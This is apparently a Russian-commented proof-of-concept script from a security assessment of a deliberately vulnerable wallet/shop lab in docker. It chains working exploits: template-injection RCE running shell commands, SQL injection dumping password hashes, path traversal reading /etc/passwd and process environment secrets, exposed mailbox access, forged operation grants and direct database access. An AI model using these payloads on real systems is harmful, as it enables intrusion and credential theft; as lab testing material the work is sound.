#!/usr/bin/env python3
"""
stage_data.py — «Данные»: RCE, дампы, файлы, почта, чужие операции.

    python3 poc/stage_data.py

Стенд должен быть поднят: docker compose up -d --build
Пояснения к каждому шагу печатаются прямо в консоли, полные шаги — в poc/STEPS.md
"""
from lib import *  # noqa: F401,F403


def lines_with(text, pattern, strip_tags=True):
    """Строки ответа, где есть паттерн; теги вырезаем — так читается вывод команд."""
    out = []
    for line in text.splitlines():
        if re.search(pattern, line):
            clean = re.sub(r"<[^>]*>", "", line).strip() if strip_tags else line
            if clean:
                out.append(clean)
    return out


def main():
    step("1. вход под рабочей учёткой")
    client = login_as("ivanov", "workplace1")
    if not client:
        fail("не удалось войти, стенд поднят?")
        return 1
    ok("сессия получена")

    step("2. OW-08: RCE: комментарий к заказу исполняется как shell-команда")
    say("Комментарий к заказу (item_comment) подставляется в исходник text/template,",
        "в котором объявлена функция exec — она вызывает sh -c (handlers_shop.go:388-420).",
        "Проверки, что заказ принадлежит текущему пользователю, нет, поэтому хватает",
        "любой учётки. Контейнер приложения работает от root, значит внутри — всё.")
    comment = '{{exec "id"}} {{exec "hostname"}} {{exec "env"}}'
    order = new_order(comment, client)
    if not order:
        fail("котировку не подтвердили")
        return 1
    ok("заказ #%s создан, комментарий сохранён в заказ" % order)
    say("открываем превью чека — шаблон с нашим комментарием выполняется:")
    r = req("GET /orders/%s/preview?renderer=classic  (item_comment → sh -c)" % order,
            "/orders/%s/preview?renderer=classic" % order, client=client)
    hits = lines_with(r.text, r"uid=|_KEY=|DATABASE_URL=")
    for line in hits:
        info(line)
    if not hits:
        fail("вывод команд в превью не нашёлся")
    else:
        artifact("OW-08 · команда выполнена на сервере",
                 "GET /orders/%s/preview → HTTP %s" % (order, r.status),
                 *hits[:8])
        ok("uid=0(root) — root в контейнере; ключи подписей и DSN базы в том же выводе.")
        say("Дальше в этой же оболочке: чтение любых файлов, сеть внутри кластера,",
            "сканирование, закладка в /app/exports для /ops/journal.")

    step("3. OW-14: дамп всех хешей паролей через SQL-инъекцию")
    say("Тот же инъекционный пункт в сумме перевода (handlers_money.go:172-180), но",
        "для чтения: подзапрос возвращает строку, приведение к bigint падает, и текст",
        "ошибки с содержимым печатается прямо в форме. Шесть логинов с bcrypt-хешами",
        "выезжают без каких-либо прав — только рабочая учётка.")
    r = req("POST /transfer/new  amount_rub=(SELECT string_agg(login||password_hash) "
            "FROM users)", "/transfer/new", client=client,
            data={"recipient": "petrova",
                  "amount_rub": "(SELECT string_agg(login||chr(61)||password_hash, "
                                "chr(10)) FROM users)",
                  "memo": "x"})
    m = r.search(r'flash bad">(.*?)</div>', re.S)
    msg = m.group(1) if m else ""
    msg = (msg.replace("&#34;", '"').replace("&#39;", "'")
              .replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">"))
    hashes = [tok for tok in msg.split() if "$2a$" in tok]
    for h in hashes:
        info(h)
    if hashes:
        artifact("OW-14 · чтение данных через SQL error",
                 "POST /transfer/new с SELECT по users → HTTP %s" % r.status,
                 "из ответа извлечены bcrypt-хеши (%d): %s" % (len(hashes), ", ".join(h[:24] for h in hashes[:4])))
        ok("хеши получены (%d шт.)" % len(hashes))
    else:
        fail("инъекция не отработала")

    step("4. OW-09: чтение любых файлов (path traversal)")
    say("Фильтр имени файла снимает ../ только один раз, результат после filepath.Join",
        "не проверяется (handlers_shop.go:449-461) — значит путь собирается любой.",
        "Читаем систему и самое ценное — окружение процесса, там ключи и DSN:")
    r = req("POST /statements/export  filename=../../../../etc/passwd",
            "/statements/export", client=client,
            data={"filename": "../../../../etc/passwd"})
    passwd_lines = r.text.splitlines()[:3]
    for line in passwd_lines:
        info(line)
    env_lines = []
    r = req("POST /statements/export  filename=../../../../proc/1/environ",
            "/statements/export", client=client,
            data={"filename": "../../../../proc/1/environ"})
    for line in r.text.replace("\x00", "\n").splitlines():
        if re.search(r"KEY|DATABASE_URL", line):
            env_lines.append(line)
            info(line)
    if any(line.startswith("root:") for line in passwd_lines) and env_lines:
        artifact("OW-09 · чтение файлов контейнера через traversal",
                 "POST filename=../../../../etc/passwd → HTTP %s; ответ: %s" %
                 (r.status, " | ".join(passwd_lines[:2])),
                 "POST filename=../../../../proc/1/environ → найдено: %s" % " | ".join(env_lines[:3]))
        ok("произвольные файлы контейнера читаются через export")
    else:
        fail("path traversal не подтверждён: passwd=%s env=%s" %
             (bool(passwd_lines), len(env_lines)))

    step("5. OW-27: вся почта компании в одном ящике")
    say("/mail отдаёт весь mail_outbox любому вошедшему (handlers_auth.go:181-200):",
        "письма других людей, ссылки сброса паролей, служебные уведомления — без",
        "фильтра по адресату. Это вторая половина цепочки захвата пароля (stage_access).")
    r = req("GET /mail  (весь outbox)", "/mail", client=client)
    info("писем в outbox: %d (включая строку шапки)" % r.text.count("</tr>"))
    for subject in r.findall(r"Сброс пароля|Проверка уведомлений")[:3]:
        info("тема: %s" % subject)
    foreign_recipients = re.findall(r"<td>([^<]+@[^<]+)</td>", r.text)
    own_email = db("SELECT email FROM users WHERE login='ivanov'")
    other_email_visible = any(addr.strip() != own_email for addr in foreign_recipients)
    if other_email_visible and r.status == 200:
        artifact("OW-27 · сотрудник видит почту других адресатов",
                 "GET /mail → HTTP %s; адрес текущего пользователя: %s" % (r.status, own_email),
                 "адреса в ответе: %s" % ", ".join(foreign_recipients[:5]),
                 "письма/ссылки из общего mail_outbox отображены в одном ответе")
        ok("все письма видны без чужого адреса")
    else:
        fail("не подтвердили чужой адрес в /mail: own=%s visible=%s" %
             (own_email, foreign_recipients[:5]))

    step("6. OW-13: чужие операции через токены /api/ops/feed")
    say("/api/ops/feed выдаёт подписи (op_grant) на 30 последних операций всех",
        "пользователей и рассовывает их в cookie (handlers_money.go:97-127). А проверка",
        "на /operations/N сверяет подпись только с uid того, кто смотрит (строки 78-89)",
        "— то есть feed сам раздаёт валидные ключи от чужих операций.")
    op = db("SELECT id FROM operations WHERE id >= (SELECT COALESCE(MAX(id)-29,0) "
            "FROM operations) AND COALESCE(from_user_id,0)<>1 AND "
            "COALESCE(to_user_id,0)<>1 ORDER BY id DESC LIMIT 1")
    if not op:
        info("чужих операций в последних 30 не нашлось")
        return 0
    role = db("SELECT role FROM users WHERE login='ivanov'")
    if role == "admin":
        say("у иванова роль admin (наши тесты переписали данные стенда) — админу и так",
            "всё можно, проверка подписей его не касается; снимем роль, чтобы показать",
            "проверку на себе. Важно: роль в куке перетирает роль из базы (auth.go:40-42),",
            "поэтому после правки перелогиниваемся, чтобы кука тоже стала employee:")
        db("UPDATE users SET role='employee' WHERE login='ivanov'")
        info("← роль ivanov в базе: employee")
        client = login_as("ivanov", "workplace1")
        if not client:
            fail("перелогин не прошёл")
            return 1
        info("← кука пересобрана: role=employee")
    info("чужая операция #%s (не ivanov), она в последних 30 — feed её выдаёт" % op)
    no_grant = req("GET /operations/%s  (без подписи — контроль)" % op, "/operations/%s" % op,
                   client=client)
    feed = req("GET /api/ops/feed  (подписи на 30 последних операций всех юзеров)",
        "/api/ops/feed", client=client)
    r = req("GET /operations/%s  (с кукой op_grant_%s из feed)" % (op, op),
            "/operations/%s" % op, client=client)
    m = r.search(r"Комментарий:</span> ([^<]*)")
    memo = m.group(1) if m else ""
    if "Операция #%s" % op in r and no_grant.status == 403 and feed.status == 200:
        artifact("OW-13 · feed выдаёт grant на чужую операцию",
                 "чужая операция #%s; без grant: HTTP %s" % (op, no_grant.status),
                 "GET /api/ops/feed → HTTP %s; cookies содержит op_grant_%s" % (feed.status, op),
                 "с grant: HTTP %s, карточка открыта; memo=%s" % (r.status, memo))
        ok("403 → 200: подписью из feed открыта чужая операция: %s" % memo)
    else:
        fail("операция не открылась")
    if role == "admin":
        db("UPDATE users SET role='admin' WHERE login='ivanov'")
        info("роль ivanov возвращена: admin")
    elif role != "admin":
        db("UPDATE users SET role='%s' WHERE login='ivanov' RETURNING role;" % role)
        login_as("ivanov", "workplace1")

    step("7. OW-34: прямой доступ к базе по паролю из репозитория")
    say("DSN с паролем wallet/wallet лежит в docker-compose.yml, sslmode=disable,",
        "порт базы открыт в сети compose — подключается любая машина в ней. Приложение",
        "не участвует: можно читать и переписывать всё в обход любого его кода.")
    info("→ psql -h db -U wallet -d wallet   (DSN postgres://wallet:wallet@db:5432/wallet)")
    user_dump = db("SELECT login||' | '||role||' | '||left(password_hash,20)||'...' "
                   "FROM users ORDER BY id;")
    if user_dump and "ivanov" in user_dump and "petrova" in user_dump:
        artifact("OW-34 · учётные данные БД дают прямое чтение",
                 "docker exec … psql -U wallet -d wallet → SELECT users",
                 *user_dump.splitlines()[:5])
        ok("подключение к БД в обход приложения вернуло строки пользователей")
    else:
        fail("прямой доступ к БД не вернул ожидаемые строки: %s" % user_dump)
    return 0


if __name__ == "__main__":
    sys.exit(main())
